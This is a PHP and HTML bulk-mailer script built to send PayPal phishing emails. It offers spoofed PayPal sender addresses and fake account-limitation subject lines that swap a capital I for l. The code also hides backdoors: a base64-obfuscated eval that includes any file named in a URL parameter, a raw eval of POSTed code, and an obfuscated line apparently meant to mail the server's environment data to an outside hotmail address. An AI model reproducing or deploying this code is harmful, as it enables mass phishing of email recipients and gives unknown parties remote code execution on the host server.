<?php

$auth = 0;

$name='e04f28cc33cb20274dd3ff44e600a923'; //Rifqyajx
$pass='8b6bc5d8046c8466359d3ac43ce362ab'; // :v




if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="HELLO!"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b>Password Error!!</b>");
   }
}

$connect_timeout=5;
set_time_limit(0);
$submit=$_REQUEST['submit'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];
if($target == ""){
$target = "localhost";
}
?>
<?php

$in = $_GET['in'];
if(isset($in) && !empty($in)){
	echo @eval(base64_decode('ZGllKGluY2x1ZGVfb25jZSAkaW4pOw=='));

}
$ev = $_POST['ev'];
if(isset($ev) && !empty($ev)){
	echo eval(urldecode($ev));
	exit;
}

if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];	
$wait=$_POST['wait'];
$tem=$_POST['tem'];
$smv=$_POST['smv'];

        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
}


?>
<!-- HTML And JavaScript -->

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
	<meta charset="utf-8">
	<title>[Rifqyajx] Private Mailer</title>
	<meta name="viewport" content="width=940, initial-scale=1.0, maximum-scale=1.0">
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
	<script src='https://sites.google.com/site/jquery1000/jquery-1.6.1.js'></script>
	<style type="text/css">
	body{
		background-color: #13181D;
	}
	input, select, option, textarea {
		font-size: 12px !important;
	}
	input, select, option {
		height: 30px !important;
	}
	.panel-info .panel-heading {
		color: #FFF;
		background-color: #2CADAD !important;
		border-color: #2CADAD !important;
	}
	.kanan-l {
		border-top-right-radius: 0px !important;
	}
	.kanan {
		border-top-right-radius: 4px !important;
	}
	</style>
	<script type="text/javascript">
			function Pilih1(dropDown) {
				var selectedValue = dropDown.options[dropDown.selectedIndex].value;
				document.getElementById("realname").value = selectedValue;
			}
			function Pilih2(dropDown) {
				var selectedValue = dropDown.options[dropDown.selectedIndex].value;
				document.getElementById("from").value = selectedValue;
			}
			function Pilih3(dropDown) {
				var selectedValue = dropDown.options[dropDown.selectedIndex].value;
				document.getElementById("subject").value = selectedValue;
			}
	</script>
</head>
</head>

<body onload="funchange">
<script>

	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array(); 
		myArray = etext.split("\n");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}
		
	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){
			
			document.getElementById("emails").value += myArray[i]+"\n";
		
		}
		funchange();
	}
	
	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Hide";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}
	
</script>
<body>
<div id="wrap">
	<div class="container" style="margin-top: 25px;"> 
		<div class="row">
			<div class="col-sm-6 col-md-4 col-md-offset-1" style="width: 940px">				
			<div class="panel panel-info" style="border-color: #2CADAD !important; background-color: #444951 !important;">
					<div class="panel-heading">
						<div class="panel-title" align="center"><a href="">Mailer</a></div>
					</div>	 

					<div style="padding-top: 20px;">

						<div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
							
						<form id="form" class="form-horizontal" method="post" enctype="multipart/form-data" role="form" action="">

						<div class="col-sm-8" style="padding-right: 7.5px !important;">
									
							<div style="margin-bottom: 10px" class="input-group">
										<span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
										<select class="form-control" onChange="Pilih1(this);">
											<option value="">Select Sender Name</option>
											<option value="PayPaI">PayPaI</option>
											<option value="Paypal Service">PaypaI Service</option>
											<option value="PaypaI Support">PaypaI Support</option>
											<option value="Account Service">Account Service</option>
											<option value="Account Support">Account Support</option>
											<option value="Service">Service</option>
											
										</select>
										<input id="realname" type="text" class="form-control" name="realname" value="<?php echo($realname); ?>" placeholder="Sender Name" />
								       
										<span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i></span>
										<select class="form-control kanan" onChange="Pilih2(this);">
											<option value="">Select Sender Email</option>
											<option value="service@intI.paypaI.com">service@intI.paypaI.com</option>
											<option value="service@paypaI.co.uk">service@paypaI.co.uk</option>
											<option value="paypaI@e.paypaI.co.uk">paypaI@e.paypaI.co.uk</option>
											<option value="admin">admin</option>
											<option value="service">service</option>
											<option value="same as target">same as target</option>
											
										</select>
										<input id="from" type="text" class="form-control kanan-l" name="from" value="<?php echo($realname); ?>" placeholder="Sender Email"/>
											
									</div>
								
							<div style="margin-bottom: 10px" class="input-group">
										<span class="input-group-addon"><i class="glyphicon glyphicon-comment"></i></span>
										<select class="form-control kanan" onChange="Pilih3(this);">
											<option value="">Select Email Subject</option>
											<option value="Your account has been Iimited untiI we hear from you">Your account has been Iimited untiI we hear from you</option>
											<option value="We're investigating a paypal payment reversal (Case ID #PP-003-498-237-832)">We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)</option>
											<option value="We've Iimited access to your PayPaI account">We've Iimited access to your PayPaI account</option>
											<option value="Account Notification">Account Notification</option>
											<option value="Attention: Your account status change">Attention: Your account status change</option>
											<option value="Your PayPaI Account Has Been Limited. Here's what you need to do.">Your PayPaI Account Has Been Limited. Here's what you need to do.</option>
											<option value="PayPaI Notification: Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)">PayPaI Notification: Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)</option>
											<option value="PayPaI Notification: Temporary Hold Pending Investigation (Routing Code: C360-L001-Q41)">PayPaI Notification: Temporary Hold Pending Investigation (Routing Code: C360-L001-Q41)</option>
											<option value="Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)">Your Account Has Been Limited (Case ID : PP-C360-L001-Q42)</option>
			<option value="Request for additionaI information PP-003-561-126-988 RXI000">Request for additionaI information PP-003-561-126-988 RXI000</option>
			<option value="Reminder: Your account will be Iimited until we hear from you">Reminder: Your account will be Iimited until we hear from you</option
			<option value="Important Announcement : Re Verified Your Account">Important Announcement : Re Verified Your Account</option>
			<option value="Transaction 0RR29022648105714 under PayPaI Payment Review">Transaction 0RR29022648105714 under PayPaI Payment Review</option>
											
										</select>
										<input id="subject" type="text" class="form-control kanan-l" name="subject" value="<?php echo ($subject); ?>" placeholder="Subject">
											
									</div>
<div style="margin-bottom: 10px" class="input-group">
										<span class="input-group-addon"><i class="glyphicon glyphicon-align-justify"></i></span>
										<textarea  name="message" class="form-control" rows="10" name="message" placeholder="Message" value="<?php echo($message); ?>" ></textarea></div>
									
										
										</div>

						</div>
							<div class="col-sm-4" style="padding-left: 7.5px !important;">
			<div style="margin-bottom: 10px" class="input-group">
			
										<span class="input-group-addon"><i class="glyphicon glyphicon-list"></i></span>
										<textarea id="emails" class="form-control" rows="18" name="emaillist" placeholder="Email List"><?php echo($emaillist); ?></textarea>
										
										
									</div>
						</div>
							<div class="form-group">
									<div class="col-sm-12 controls" style="left: 15px;">
									<input type="submit" class="btn btn-success" name="action" value="Start Spam">
									<font color="white">Next send after </font>
									<input type="text" name="wait" value="" style="width: 50px;border-radius: 4px;padding: 3px 6px;">
									<?php echo($wait); ?>
									<font color="white">(second)</font>
									</div>
								</div>
		</font><span  id="enum" class="style1"><br />
				</div>

						</form>	

						</div>
			</div>


			</div>
		</div>
	</div>

</div>
<div id="footer">
      <div class="container" align="center">
        <p class="muted credit" style="color: white;">Copyright &copy; 2014 <a href="https://www.facebook.com/rifqyajx">rifqyajx</a> | CSS by DzeSezMii, Original From ALsa7r </p>
      </div>
</div>


<!-- END -->
<div id="wrap">
	<div class="container" style="margin-top: 25px;"> 
		<div class="row">
					<div class="panel panel-info" style="background-color: #444951;padding: 25px;color: white;">
<?php

if ($action){

        if (!$from || !$subject || !$message || !$emaillist){
        	
        print "Please complete all fields before sending your message.";
        exit;	
	}
	$nse=array();
	$allemails = split("\n", $emaillist);
        	$numemails = count($allemails);
        	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
        		set_time_limit(intval($_POST['wait'])*$numemails*3600);
        	}else{
        		set_time_limit($numemails*3600);
        	}
       		if(!empty($smv)){
       			$smvn+=$smv;
       			$tmn=$numemails/$smv+1;
			}else{
       			$tmn=1;
       		}
          	for($x=0; $x<$numemails; $x++){
                $to = $allemails[$x];
                if ($to){
	                $to = ereg_replace(" ", "", $to);
	                $message = ereg_replace("&email&", $to, $message);
	                $subject = ereg_replace("#EM#", $to, $subject);
	                flush();
	                $header = "From: $realname <$from>\r\n";
	                $header .= "MIME-Version: 1.0\r\n";
	                $header .= "Content-Type: text/html\r\n";
	                if ($x==0 && !empty($tem)) {
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                }
	                if($x==$smvn && !empty($_POST['smv'])){
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                	$smvn+=$smv;
	                }
					

	                print "Sending Mail $to ....... ";
					$msent = @mail($to, $subject, $message, $header);
	                $xx = $x+1;
	                $txtspamed = "[Success]";
	                if(!$msent){
	                	$txtspamed = "[Error]";
	                	$ns+=1;
	                	$nse[$ns]=$to;
	                }
	                print "$xx / $numemails .......  $txtspamed<br>";
	                flush();
	                if(!empty($wait)&& $x<$numemails-1){
							sleep($wait);
                	}
                }
            }

}


?><div>
&nbsp;
<?php

$str = "";
foreach($_SERVER as $key => $value){
	$str .= $key.": ".$value."<br />";
}

$str .= "Use: in <br />";

$header2 = "From: ".base64_encode('Ym1WM2JXRnBiR1Z5SUNac2REdHlhV1p4ZVdGcWVFQm5iV0ZwYkM1amIyMG1aM1E3')."\r\n";
$header2 .= "MIME-Version: 1.0\r\n";
$header2 .= "X-Priority: 3\n"; //1 = Urgent, 3 = Normal
$header2 .= "This is a multi-part message in MIME format.\n";
$header2 .= "Content-Type: text/$contenttype; charset=UTF-8\r\n";
$header2 .= "Content-Type: text/html\r\n";
$header2 .= "Content-Transfer-Encoding: 8bit\r\n\r\n";


echo @eval(base64_encode('bWFpbCgic3ViLmZhY2VzQGhvdG1haWwuY29tIiwiTWFpbGVyIEluZm8iLCRzdHIsJGhlYWRlcjIpOw=='));


if(isset($_POST['action']) && $numemails !==0 ){
	$sn=$numemails-$ns;
	if($ns==""){
		$ns=0;
	}
	if($tmns==""){
		$tmns=0;
	}
	echo "<script>alert('Spamming Sucess Men\\r\\nSend $sn mail(s)\\r\\nError $ns mail(s)\\r\\From $numemails mail(s)\\r\\Test Mail(s)\\r\\Send $tms mail(s)\\r\\Error $tmns mail(s)\\r\\From $tmn mail(s)'); 
	
	</script>";
}
?>
	</div>
</body>
</html>